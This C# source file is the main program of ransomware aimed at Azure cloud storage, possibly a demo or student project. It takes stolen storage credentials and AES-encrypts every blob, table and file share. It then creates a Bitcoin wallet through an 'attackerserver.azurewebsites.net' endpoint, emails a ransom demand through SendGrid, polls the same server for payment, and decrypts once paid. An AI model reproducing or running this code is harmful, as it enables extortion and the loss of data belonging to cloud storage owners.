using Microsoft.WindowsAzure.Storage;
using ransomeware1;
using System.IO;
using System.Threading.Tasks;

using System.Net.Http.Headers;
using System.Text;
using System.Net.Http;
using System.Web;
using System;
using SendGrid;
using SendGrid.Helpers.Mail;
using System.Collections.Generic;
using System.Linq;

namespace ransomeware
{
    class Program
    {
        public static void Main(string[] args)
        {
            foreach (string arg in args)
            {
                Console.WriteLine(arg);
            }

            if (args.Length != 2)
            {
                Console.WriteLine("Missing argument: Path to Storage Creds, Path to Public Key");
                return;
            }

            List<string> names = new List<string>();
            List<string> keys = new List<string>();
            int i = 0;
            foreach (string line in File.ReadLines(args[0]))
            {
                string trimmed = line.Trim(new char[] { '\n', '\r' });
                if (i % 2 != 0)
                {
                    keys.Add(trimmed);
                }
                else
                {
                    names.Add(trimmed);
                }
                i++;
            }

            if (names.Count != keys.Count || names.Count == 0)
            {
                Console.WriteLine("Bad Storage Creds file");
                return;
            }

            int index = names.IndexOf("checkprog");
            if (index == -1)
            {
                Console.WriteLine("Cant find checkprog");
                return;
            }

            string accountName = names[index];
            string key = keys[index];


            CloudStorageAccount storageAccount = Utils.Connect(accountName, key);

            if (storageAccount != null)
            {
                Console.WriteLine("Connection Success");
            }
            else
            {
                Console.WriteLine("Connection Failed");
                return;
            }

            AESEncryption encrypt = new AESEncryption();

            Blob_Storage.EncryptBlobs(storageAccount, encrypt);

            Table_Storage.EncryptTables(storageAccount, encrypt);

            File_Storage.EncryptFiles(storageAccount, encrypt);

            encrypt.OnFinishEncryption(storageAccount, args[1]);

            Random rnd = new Random();

            var tsk = handlePayment("rans" + rnd.Next(100, 1000).ToString(), "sefi_eyal@outlook.com");
            tsk.Wait();
            
            if (!tsk.Result)
            {
                Console.WriteLine("Failed to send email or generate wallet");
            }

            Console.WriteLine("Recieved payment, started decrypting all files");

            decryptAllFiles(storageAccount).Wait(); 

        }

        static async Task<bool> handlePayment(string id, string email)
        {
            string wallet = await createWallet(id);
            bool status = await SendEmail(email, wallet);
            if (!status)
            {
                return false;
            }
            while(true)
            {
                Console.WriteLine("Waiting for payment...");
                System.Threading.Thread.Sleep(1000 * 60 * 2); //Sleep for 5 minutes
                if (await getBalance(id) > 0.001)
                {
                    break;
                }
                break;
            }
            return true;
        }

        static async Task<bool> SendEmail(string sendto, string wallet)
        {
            var apiKey = "";
            var client = new SendGridClient(apiKey);
            var msg = new SendGridMessage()
            {
                From = new EmailAddress("payment@ransomware.com", "R Team"),
                Subject = "Your Cloud Has Been Encrypted",
                //PlainTextContent = "Dear User," + Environment.NewLine + "Your Cloud has been encrypted, to access your"
                //+ " storage again, please move 0.001BTC into the following address: " + wallet,
                HtmlContent = "<p>Dear User,<br>Your Cloud has been encrypted, to access your storage again, " +
                                " please move 0.007BTC into the following address: " + wallet + ".</p>"
            };
            msg.AddTo(new EmailAddress(sendto));
            var response = await client.SendEmailAsync(msg);
            return response.StatusCode == System.Net.HttpStatusCode.OK
                || response.StatusCode == System.Net.HttpStatusCode.Accepted;
        }

        public static async Task<string> createWallet(string customerId)
        {
            //string url = "http://localhost:7071/api/AddWallet?id=" + customerId;
            string url = "https://attackerserver.azurewebsites.net/api/AddWallet?code===&id="
                + customerId;
            HttpClient client = new HttpClient();
            var response = await client.PostAsync(url, null);
            if (!response.IsSuccessStatusCode)
            {
                return null;
            }
            string walletId = await response.Content.ReadAsStringAsync();
            if (string.IsNullOrEmpty(walletId))
            {
                return null;
            }
            return walletId;
        }

        public static async Task<double> getBalance(string customerId)
        {
            //string url = "http://localhost:7071/api/GetBalance?id=" + customerId;
            string url = "https://attackerserver.azurewebsites.net/api/GetBalance?code=&id=" + customerId;
            HttpClient client = new HttpClient();
            var response = await client.PostAsync(url, null);
            if (!response.IsSuccessStatusCode)
            {
                return -1;
            }
            string balanceStr = await response.Content.ReadAsStringAsync();
            if (string.IsNullOrEmpty(balanceStr))
            {
                return -1;
            }
            double balance;
            if (!Double.TryParse(balanceStr, out balance))
            {
                return -1;
            }
            return balance;
        }

        static async Task decryptAllFiles(CloudStorageAccount storageAccount)
        {
            AESDecryption dec = new AESDecryption();

            Utils.Download(storageAccount, "key");
            Utils.Download(storageAccount, "IV");

            await dec.retrieveKeyFromServer(File.ReadAllBytes("./key.txt"),
                File.ReadAllBytes("./IV.txt"));
            
            Blob_Storage.DecryptBlobs(storageAccount, dec);

            Table_Storage.DecryptTables(storageAccount, dec);

            File_Storage.DecryptFiles(storageAccount, dec);

        }

        

    }

}
